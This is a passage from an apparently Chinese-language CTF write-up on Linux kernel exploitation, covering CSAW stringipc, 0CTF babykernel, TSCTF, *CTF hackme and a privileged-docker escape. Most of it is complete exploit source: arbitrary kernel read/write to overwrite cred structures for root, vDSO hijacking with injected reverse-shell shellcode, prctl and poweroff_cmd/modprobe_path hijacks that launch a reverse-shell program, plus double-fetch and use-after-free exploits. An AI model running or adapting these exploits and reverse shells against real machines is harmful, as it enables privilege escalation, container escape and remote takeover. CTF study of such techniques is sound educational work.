fd = open("/dev/csaw",O_RDWR); if(fd &lt; 0)&#123; puts("[:(]Open fail..."); exit(-1); &#125; struct alloc_channel_args alloc_channel; alloc_channel.buf_size = 0x100; alloc_channel.id = -1; ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_channel); printf("[:)]This is our channel_id: %d\n",alloc_channel.id); struct shrink_channel_args shrink_channel; shrink_channel.id = alloc_channel.id; shrink_channel.size = 0x100+1; ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel); puts("[:)]Now we can r&amp;w any where we want!!!"); //char buf[0x1000]; char* buf = malloc(0x1000); size_t target_addr = 0; struct seek_channel_args seek_channel; struct read_channel_args read_channel; size_t result = 0; size_t cred = 0; size_t real_cred = 0; size_t task_struct_addr = 0; for(size_t addr = 0xffff880000000000;addr&lt;0xffffc80000000000;addr+=0x1000)&#123; seek_channel.id = alloc_channel.id; seek_channel.index = addr-0x10; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); read_channel.id = alloc_channel.id; read_channel.buf = buf; read_channel.count = 0x1000; ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel); result = memmem(buf,0x1000,fake_str,16); if(result)&#123; cred = *(size_t*)(result-8); real_cred = *(size_t*)(result-0x10); if(cred == real_cred)&#123; target_addr = addr + (result-(size_t)buf); printf("[:)]target_addr = %p\n",target_addr); task_struct_addr = target_addr - 0x9a8; printf("[:)]task_struct_addr = %p\n",task_struct_addr); printf("[:)]cred_addr = %p\n",real_cred); cred_addr = real_cred; break; &#125; &#125; &#125; struct write_channel_args write_channel; char zero = '\x00'; for(int i = 0;i &lt; 28;i++)&#123; seek_channel.id = alloc_channel.id; seek_channel.index = cred_addr-0x10+i; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); write_channel.id = alloc_channel.id; write_channel.buf = &amp;zero; write_channel.count = 1; ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel); &#125; if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]Not root..."); exit(-1); &#125; return 0;&#125; 解法二： 劫持vSDO 反弹shell：这道题的反弹shell让我对内核有了更深的理解： 反弹shell就是别的进程打开了一个shell，本来他是可以正常输入命令与kernel交互的，但是我们把其交互的输入输出全部重定向到了我们当前的进程，等于我们控制了一个傀儡进程，我们控制傀儡进程与kernel交互的输入，获取交互后kernel反馈回的输出，也就是实际上是这个傀儡进程在与kernel交互，我们在幕后控制其话语权，所以若这个傀儡进程为root权限，则等于我们间接性的获得了以root权限与kernel交互的能力。等于完成了提权。 基本流程为： 先用getuid系统调用返回值是否为0来判断当前进程是否为root进程，若不是则会调用gettimeofday系统调用继续正常运行。若为root权限进程，则用fork()产生一个子进程，在子进程中进行正常的反弹shell，在父进程中仍然调用gettimeofday，这种反弹shell触发比较稳定，不会扰乱某root进程正常的执行流程。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576noppush rbxxor rax,raxmov al, 0x66syscall #check uidxor rbx,rbxcmp rbx,raxjne emulate #If not root, only emulate.xor rax,raxmov al,0x39syscall #forkxor rbx,rbxcmp rax,rbxje connectbackemulate:pop rbxxor rax,raxmov al,0x60syscallretqconnectback:xor rdx,rdxpushq 0x1pop rsipushq 0x2pop rdipushq 0x29pop rax syscall #socketxchg rdi,raxpush raxmov rcx, 0xfeffff80faf2fffd #NOT&apos;ed 127.0.0.1:3333not rcxpush rcxmov rsi,rsppushq 0x10pop rdxpushq 0x2apop raxsyscall #connectxor rbx,rbxcmp rax,rbxje shxor rax,raxmov al,0xe7syscall #exitsh:noppushq 0x3pop rsiduploop:pushq 0x21pop raxdec rsisyscall #dupjne duploopmov rbx,0xff978cd091969dd0 #NOT&apos;ed &quot;/bin/sh&quot;not rbxpush rbxmov rdi,rsppush raxpush rdimov rsi,rspxor rdx,rdxmov al,0x3bsyscall #execvexor rax,raxmov al,0xe7syscall #exit dump_vDSO：vDSO是一块大小在0x2000以内的被映射到内存中的文件，里面含有四个函数/快速系统调用：clock_gettime，gettimeofday，time，getcpu。还含有四个字符串：__vdso_clock_gettime，__vdso_gettimeofday，__vdso_time，__vdso_getcpu。 我们的目标是获取到内核态中vDSO的地址。 可用如下程序： 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/auxv.h&gt; #include &lt;sys/mman.h&gt;int main()&#123; unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR); printf("vDSO_addr = %p\n",sysinfo_ehdr); unsigned long result = 0; result = memmem(sysinfo_ehdr,0x1000,"gettimeofday",12); printf("result = %p\n",result); printf("gettimeofday_offset = %p\n",result-sysinfo_ehdr); /* if (sysinfo_ehdr!=0)&#123; for (int i=0;i&lt;0x2000;i+=1)&#123; printf("%02x ",*(unsigned char *)(sysinfo_ehdr+i)); &#125; &#125; */ return 0;&#125; 这段程序可以确定用户态的vDSO段地址，然后确定了gettimeofday这个字符串所在的偏移，再到内核中利用任意地址读对0xffffffff80000000~0xffffffffa0000000区域进行爆破，用上述程序得到的偏移offset进行检测：if(!strcmp(&quot;gettimeofday&quot;,addr+offset))，得到vDSO内核态基址之后，就可以在gdb中动态调试，用dump memory将其dump下来：dump memory ./vDSO.dump 内核态vDSO基址 内核态vDSO基址+0x2000。然后可以将dump下来的vDSO.dump文件放进ida或者用objdump查看其中函数代码段的偏移，在内核态将shellcode注入对应地址再到用户态调用即可。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/auxv.h&gt; #define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE+1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE+2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE+3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE+5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE+6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE+7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE+8struct alloc_channel_args &#123; size_t buf_size; int id;&#125;;struct open_channel_args &#123; int id;&#125;;struct grow_channel_args &#123; int id; size_t size;&#125;;struct shrink_channel_args &#123; int id; size_t size;&#125;;struct read_channel_args &#123; int id; char *buf; size_t count;&#125;;struct write_channel_args &#123; int id; char *buf; size_t count;&#125;;struct seek_channel_args &#123; int id; loff_t index; int whence;&#125;;struct close_channel_args &#123; int id;&#125;;int check_shellcode(char* shellcode)&#123; size_t addr = getauxval(AT_SYSINFO_EHDR); if(addr == 0)&#123; puts("[:(]Get vSDO_addr in userspace fail..."); &#125; else&#123; printf("[:)]vSDO_addr in userspace = %p\n",addr); &#125; if(memmem(addr,0x1000,shellcode,strlen(shellcode)))&#123; return 1; &#125; return 0;&#125;int main()&#123; size_t vDSO_addr = 0; setvbuf(stdout,0LL,2,0LL); int fd = open("/dev/csaw",O_RDWR); if(fd &lt; 0)&#123; puts("[:(]Open fail..."); exit(-1); &#125; struct alloc_channel_args alloc_channel; alloc_channel.buf_size = 0x100; alloc_channel.id = -1; ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_channel); printf("[:)]This is our channel_id: %d\n",alloc_channel.id); struct shrink_channel_args shrink_channel; shrink_channel.id = alloc_channel.id; shrink_channel.size = 0x100+1; ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel); puts("[:)]Now we can r&amp;w any where we want!!!"); char *buf = malloc(0x1000); struct seek_channel_args seek_channel; struct read_channel_args read_channel; for(size_t addr=0xffffffff80000000;addr&lt;0xffffffffffffefff;addr+=0x1000)&#123; seek_channel.id = alloc_channel.id; seek_channel.index = addr-0x10; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); read_channel.id = alloc_channel.id; read_channel.buf = buf; read_channel.count = 0x1000; ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel); if(!strcmp("gettimeofday",buf+0x2cd))&#123; vDSO_addr = addr; printf("[:)]vDSO_addr in kernelspace = %p\n",vDSO_addr); break; &#125; &#125; seek_channel.id = alloc_channel.id; seek_channel.index = vDSO_addr+0xc80-0x10; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); struct write_channel_args write_channel; char shellcode[] = "\x90\x53\x48\x31\xC0\xB0\x66\x0F" "\x05\x48\x31\xDB\x48\x39\xC3\x75" "\x0F\x48\x31\xC0\xB0\x39\x0F\x05" "\x48\x31\xDB\x48\x39\xD8\x74\x09" "\x5B\x48\x31\xC0\xB0\x60\x0F\x05" "\xC3\x48\x31\xD2\x6A\x01\x5E\x6A" "\x02\x5F\x6A\x29\x58\x0F\x05\x48" "\x97\x50\x48\xB9\xFD\xFF\xF2\xFA" "\x80\xFF\xFF\xFE\x48\xF7\xD1\x51" "\x48\x89\xE6\x6A\x10\x5A\x6A\x2A" "\x58\x0F\x05\x48\x31\xDB\x48\x39" "\xD8\x74\x07\x48\x31\xC0\xB0\xE7" "\x0F\x05\x90\x6A\x03\x5E\x6A\x21" "\x58\x48\xFF\xCE\x0F\x05\x75\xF6" "\x48\x31\xC0\x50\x48\xBB\xD0\x9D" "\x96\x91\xD0\x8C\x97\xFF\x48\xF7" "\xD3\x53\x48\x89\xE7\x50\x57\x48" "\x89\xE6\x48\x31\xD2\xB0\x3B\x0F" "\x05\x48\x31\xC0\xB0\xE7\x0F\x05"; write_channel.id = alloc_channel.id; write_channel.buf = shellcode; write_channel.count = strlen(shellcode); ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel); if(check_shellcode(shellcode))&#123; puts("[:)]Write shellcode success!!!"); if(fork() == 0)&#123; puts("[:)]Trigger shell!!!"); sleep(1); void (*gettimeofday)(); gettimeofday = 0xc80 + getauxval(AT_SYSINFO_EHDR); gettimeofday(); exit(-1); &#125; system("nc -lp 3333"); &#125; else&#123; puts("[:(]Write shellcode fail..."); exit(0); &#125; return 0;&#125; 解法三：劫持prctl 寻找偏移：这道题需要找偏移的变量为： poweroff_cmd，一个可写的字符串全局变量。 hp-&gt;hook.task_prctl，一个函数指针，需要动态调试。 poweroff_work_func，一个函数。 有源码：自己下载对应版本的源码自行编译得到带符号表的vmlinux与bzImage，将vmlinux放到内核源码下（不要移动即可），将bzImage替换题目给的bzImage，这里需要注意的是即使内核版本一样偏移也会有小的差异，如果bzImage与vmlinux不配套的话，调试的时候会发生很诡异的事情，请自行尝试: ）。 然后就可以对内核函数直接下断点，因为有符号表了，看结构体也方便的多了，可以用prctl这个函数来在中间某处断下exp，看中间变量的值是否写入成功等。 无源码：懒得下载编译源码，闲太麻烦了的话，可以先用root权限进入qemu，然后cat /proc/kallsyms | grep symbols_you_want_to_get来找你要的变量或者函数的加载地址，然后cat /proc/kallsyms | grep startup_64来看内核代码加载基址，相减确定偏移即可。 若是像找hp-&gt;hook.task_prctl这种需要动态调试到现场才可看到，则可以用上一步得到的函数地址来在gdb里先下好断点（因为没有符号表，所以只能先用root看到地址再下断点），然后c到那里，然后单步跳到对应的函数调用汇编语句，例如这题是call qword ptr [rbx+0x18]，再看寄存器确定偏移即可。 反弹shell：这道题最终的调用为：call_usermodehelper(poweroff_cmd)，我们这时已经将poweroff_cmd改为可控字符串了。call_usermodehelper()会运行poweroff_cmd这个进程，且赋予其root权限。所以等于这个函数帮助我们完成了提权，所以这时候我们可以选择运行一个我们自己编译好的正常的反弹shell程序，也可以直接将flag的权限变为777。 reverse_shell：12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;netdb.h&gt;#include &lt;sys/types.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc,char *argv[])&#123; int sockfd,numbytes; char buf[BUFSIZ]; struct sockaddr_in their_addr; while((sockfd = socket(AF_INET,SOCK_STREAM,0)) == -1); their_addr.sin_family = AF_INET; their_addr.sin_port = htons(2333); their_addr.sin_addr.s_addr=inet_addr("127.0.0.1"); bzero(&amp;(their_addr.sin_zero), 8); while(connect(sockfd,(struct sockaddr*)&amp;their_addr,sizeof(struct sockaddr)) == -1); dup2(sockfd,0); dup2(sockfd,1); dup2(sockfd,2); system("/bin/sh"); return 0;&#125; exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE+1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE+2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE+3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE+5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE+6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE+7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE+8struct alloc_channel_args &#123; size_t buf_size; int id;&#125;;struct open_channel_args &#123; int id;&#125;;struct grow_channel_args &#123; int id; size_t size;&#125;;struct shrink_channel_args &#123; int id; size_t size;&#125;;struct read_channel_args &#123; int id; char *buf; size_t count;&#125;;struct write_channel_args &#123; int id; char *buf; size_t count;&#125;;struct seek_channel_args &#123; int id; loff_t index; int whence;&#125;;struct close_channel_args &#123; int id;&#125;;int main()&#123; struct alloc_channel_args alloc_channel; struct shrink_channel_args shrink_channel; struct seek_channel_args seek_channel; struct read_channel_args read_channel; struct write_channel_args write_channel; setvbuf(stdout,0LL,2,0LL); int fd = open("/dev/csaw",O_RDWR); if(fd &lt; 0)&#123; puts("[:(]Open fail..."); exit(-1); &#125; alloc_channel.buf_size = 0x100; alloc_channel.id = -1; ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_channel); printf("[:)]This is our channel_id: %d\n",alloc_channel.id); shrink_channel.id = alloc_channel.id; shrink_channel.size = 0x100+1; ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel); puts("[:)]Now we can r&amp;w any where we want!!!"); char *buf = malloc(0x1000); size_t vDSO_kernel = 0; size_t addr=0xffffffff80000000; for(;addr&lt;0xffffffffffffefff;addr+=0x1000)&#123; seek_channel.id = alloc_channel.id; seek_channel.index = addr-0x10; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); read_channel.id = alloc_channel.id; read_channel.buf = buf; read_channel.count = 0x1000; ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel); if(!strcmp(buf+0x2cd,"gettimeofday"))&#123; vDSO_kernel = addr; printf("[:)]Find vDSO_addr in kernelspace: %p\n",vDSO_kernel); break; &#125; &#125; size_t kernel_base = vDSO_kernel &amp; 0xffffffffff000000; printf("[:)]Kernel_base = %p\n",kernel_base); size_t prctl_hook = 0xeb7df8; size_t poweroff_cmd = 0xe4dfa0; size_t poweroff_work_func_addr = 0xa39c0; prctl_hook += kernel_base; poweroff_cmd += kernel_base; poweroff_work_func_addr += kernel_base; printf("[:)]Prctl_hook_addr = %p\n",prctl_hook); printf("[:)]Poweroff_cmd_addr = %p\n",poweroff_cmd); printf("[:)]Powoff_work_func_addr = %p\n",poweroff_work_func_addr);//-------------------------------------------------------------- seek_channel.id = alloc_channel.id; seek_channel.index = poweroff_cmd-0x10; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); memset(buf,'\x00',0x1000); //strcpy(buf,"/bin/chmod 777 /flag\x00"); strcpy(buf,"/reverse_shell\x00"); write_channel.id = alloc_channel.id; write_channel.buf = buf; write_channel.count = strlen(buf)+1; ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel);//-------------------------------------------------------------- seek_channel.id = alloc_channel.id; seek_channel.index = prctl_hook-0x10; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); memset(buf,'\x00',0x1000); *(size_t *)buf = poweroff_work_func_addr; write_channel.id = alloc_channel.id; write_channel.buf = buf; write_channel.count = 8; ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel); if(fork() == 0)&#123; puts("[:)]Trigger!!!"); prctl(0,0,0,0,0); exit(0); &#125; system("nc -lp 2333"); return 0;&#125; 2018强网杯_solidcore主要限制了内存写的范围必须大于0xffffffff80000000，并且限制了内核态vDSO的写入权限。 同2015CSAW_stringipc的劫持prctl方法。 20180CTF-FINAL_babykernel思路：Double Fetch，需要多跑几次。 exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;pthread.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int finish = 0;int times = 3000;unsigned long long flag_addr;struct user&#123; char* flag; int len;&#125;;void change_flag_addr(void *a1)&#123; struct user* tmp = a1; while(finish == 0)&#123; tmp-&gt;flag = flag_addr; &#125;&#125;int main()&#123; int fd = open("/dev/baby",2); ioctl(fd,0x6666,0); system("dmesg | grep flag &gt; user.txt"); FILE* user_fd = fopen("user.txt","r"); if(user_fd &lt; 0)&#123; puts("[:(]Open error..."); exit(0); &#125; char user_buf[0x100] = &#123;0&#125;; fgets(user_buf,0x100,user_fd); //size_t flag_addr = *(size_t*)flag; //puts(flag); //printf("[:)]Flag_addr = %p\n",*(unsigned long long *)flag); flag_addr = strtoull(user_buf+31,user_buf+31+0x10,0x10); printf("[:)]Flag_addr = %p !!!\n",flag_addr); pthread_t p1; struct user real_struct; char test_flag[] = "flag&#123;111111111111111111111111111&#125;"; real_struct.flag = test_flag; real_struct.len = 33; pthread_create(&amp;p1,NULL,change_flag_addr,&amp;real_struct); for(int i = 0; i &lt; times; i++)&#123; real_struct.flag = test_flag; ioctl(fd,0x1337,&amp;real_struct); &#125; finish = 1; pthread_join(p1,NULL); close(fd); printf("[:)]Result:\n"); system("dmesg | grep flag"); return 0;&#125; 2019TSCTF_babykernel：思路：cred结构体前0x20字节数据分布，如果可以的话，改前28字节较为稳定，只改uid与gid为0貌似也可以。。。 1234567|uid |usage| |suid|gid ||euid|sgid | | |egid|gdb-peda$ x/80xg 0xffff8880000259800xffff888000025980: 0x000003e800000003 0x000003e8000003e80xffff888000025990: 0x000003e8000003e8 0x000003e8000003e80xffff8880000259a0: 0x00000000000003e8 0x0000000000000000 创建新进程时：内核会调用：prepare_cred-&gt;kmem_cache_alloc。 kmem_cache_alloc用rsi来传参，也就是申请的内存大小，即cred结构体的大小。可以写demo程序动态调试查看，在这道题的环境中正好为0xD0，与题目可控的chunk的大小一致。 题目漏洞为UAF，较为基础。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;void debug()&#123; getchar();&#125;void new(int fd,int index)&#123; ioctl(fd,10010,index);&#125;void delete(int fd,int index)&#123; ioctl(fd,10086,index);&#125;int main()&#123; int fd = open("/dev/tshop",0); if(fd &lt; 0)&#123; printf("[:(]Open error..."); exit(-1); &#125; //debug(); new(fd,0); new(fd,1); delete(fd,0); delete(fd,1); int pid = fork(); if(pid == 0)&#123; sleep(2); if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]Not root..."); exit(-1); &#125; &#125; else if(pid &lt; 0)&#123; puts("[:(]Fork error..."); exit(-1); &#125; else&#123; delete(fd,1); new(fd,3); sleep(1000); &#125; return 0;&#125; 2019云安全线下rw_docker：唉，这道题想想都难受，这么简单的一题。。。当时却因为种种原因混杂导致没能做出来，甚至都没静下心去看。 虽然表面上是个Escape，但实际上就是个极其简单的kernel，只不过利用了docker run时带--privileged参数。 –privileged 大约在0.6版，privileged被引入docker。使用该参数，container内的root拥有真正的root权限。否则，container内的root只是外部的一个普通用户权限。privileged启动的容器，可以看到很多host上的设备，并且可以执行mount。甚至允许你在docker容器中启动docker容器。 所以当我们在docker中运行exp达到提权成功时，等于获得了主机的root，也就可以弹出主机的计算器，也就相当于逃逸成功了。 进入宿主机，加载漏洞模块，将宿主机的23端口映射到docker的22端口。 12sudo insmod /home/b/de.kosudo docker run -itd --privileged -p 127.0.0.1:23:22 d77241e92fe6 /bin/bash -c "/etc/init.d/ssh start;/bin/bash" ssh试一下是否映射成功： ssh root@127.0.0.1 -p23，若输入密码后可以进入docker则说明映射成功。 接着写好exp，将exp复制到docker中。 1scp -P 23 ./myexp root@127.0.0.1:/home 接着ssh进入docker，来到/home目录下运行复制来的exp，看到宿主机弹出计算器就算成功了。 至于题目本身。。。emm，我觉得正常人在平稳心态状态下学半天kernel基础知识就可以解出。 exp：1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;int main()&#123; int fd = open("/proc/de",2); char *buf = malloc(0x10); memset(buf,'\x00',0x10); buf[0] = '\xFE'; write(fd,buf,10); buf[0] = '\xFD'; write(fd,buf,1); return 0;&#125; 另一种解法：挂载磁盘，修改/etc/crontab文件： https://ama2in9.top/2019/12/12/docker_escape/ 2019*CTF_hackme初始解法：算是自己独立做出来的第一道非水题kernel，提权用的方法是传统的修改cred结构体的方法。 需要注意的是这题给的kernel中貌似没有security_task_prctl。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;struct chunk&#123; size_t index; char* buf; long long size; long long offset;&#125;;struct chunk* user_chunk;void uread(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30003,user_chunk);&#125;void uwrite(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30002,user_chunk);&#125;void new(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30000,user_chunk);&#125;void delete(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30001,user_chunk);&#125;int main()&#123; int fd = open("/dev/hackme",0); if(fd &lt; 0 )&#123; printf("[:(]Open error...\n"); exit(-1); &#125; user_chunk = (struct chunk*)malloc(sizeof(struct chunk)); char* buf = malloc(0x1000); memset(buf,'0',0x100); new(fd,0,buf,0x100,0); memset(buf,'1',0x100); new(fd,1,buf,0x100,0); memset(buf,'2',0x100); new(fd,2,buf,0x100,0); uread(fd,0,buf,0x200,-0x200); size_t kernel_base = *((size_t*)buf+5) - 0x849ae0; printf("[:)]kernel_base = %p\n",kernel_base); delete(fd,0,buf,0,0); delete(fd,1,buf,0,0); uread(fd,2,buf,0x100,-0x100); size_t heap_base = *(size_t*)buf - 0x17a500; printf("[:)]heap_base = %p\n",heap_base); *(size_t *)buf = kernel_base + 0x811040; uwrite(fd,2,buf,0x100,-0x100); memset(buf,'\x00',0x100); new(fd,0,buf,0x100,0); new(fd,1,buf,0x100,0); uread(fd,1,buf,0x20,-0x20); size_t mod_base = *(size_t*)buf - 0x6000; printf("[:)]mod_base = %p\n",mod_base); delete(fd,0,buf,0,0); *(size_t*)buf = mod_base+0x2440; uwrite(fd,2,buf,0x100,-0x100); memset(buf,'\x00',0x100); new(fd,0,buf,0x100,0); new(fd,3,buf,0x100,0); prctl(PR_SET_NAME,"xiaoxiaorenwu.."); size_t result = 0; size_t cred_addr; size_t real_cred_addr; size_t target_addr; size_t task_struct_addr; char* buf1 = malloc(0x1000); for(size_t addr=heap_base;addr&lt;0xffffc80000000000;addr+=0x1000)&#123; *(size_t*)buf = addr; *((size_t*)buf+1) = 0x1000; uwrite(fd,3,buf,0x10,0); uread(fd,4,buf1,0x1000,0); result = memmem(buf1,0x1000,"xiaoxiaorenwu..",0x10); if(result)&#123; cred_addr = *(size_t*)(result-8); real_cred_addr = *(size_t*)(result-0x10); if(cred_addr == real_cred_addr)&#123; target_addr = addr + (result-(size_t)buf1); task_struct_addr = target_addr - 0x9a8; printf("[:)]task_struct_addr = %p\n",task_struct_addr); printf("[:)]find cred_addr = %p\n",cred_addr); free(buf1); buf1 = 0; break; &#125; &#125; &#125; *(size_t*)buf = cred_addr; *((size_t*)buf+1) = 28; uwrite(fd,3,buf,0x10,0); memset(buf,'\x00',28); uwrite(fd,4,buf,28,0); if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]Not root..."); exit(-1); &#125; return 0;&#125; 其他解法一：modprobe_path这是一个类似于poweroff_cmd的全局变量，会被call_userhelpermode当做第一个参数调用，原本内容为：/sbin/modprobe，更改为我们自己的命令即可，触发条件为执行一个非正确格式的ELF文件。 我这里还尝试了直接运行/bin/sh，结果是失败的，不知道为什么，但是之前改poweroff_cmd时改为/bin/sh同样是失败的，可能只能运行一个命令没法交互吧，还尝试了反弹shell，但是因为文件系统中没有初始化网络相关设备，所以也失败了，结果如下图： exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;struct chunk&#123; size_t index; char* buf; long long size; long long offset;&#125;;struct chunk* user_chunk;void uread(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30003,user_chunk);&#125;void uwrite(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30002,user_chunk);&#125;void new(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30000,user_chunk);&#125;void delete(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30001,user_chunk);&#125;int main()&#123; int fd = open("/dev/hackme",0); if(fd &lt; 0 )&#123; printf("[:(]Open error...\n"); exit(-1); &#125; user_chunk = (struct chunk*)malloc(sizeof(struct chunk)); char* buf = malloc(0x1000); memset(buf,'0',0x100); new(fd,0,buf,0x100,0); memset(buf,'1',0x100); new(fd,1,buf,0x100,0); memset(buf,'2',0x100); new(fd,2,buf,0x100,0); uread(fd,0,buf,0x200,-0x200); size_t kernel_base = *((size_t*)buf+5) - 0x849ae0; printf("[:)]kernel_base = %p\n",kernel_base); delete(fd,0,buf,0,0); delete(fd,1,buf,0,0); uread(fd,2,buf,0x100,-0x100); size_t heap_base = *(size_t*)buf - 0x17a500; printf("[:)]heap_base = %p\n",heap_base); *(size_t *)buf = kernel_base + 0x811040; uwrite(fd,2,buf,0x100,-0x100); memset(buf,'\x00',0x100); 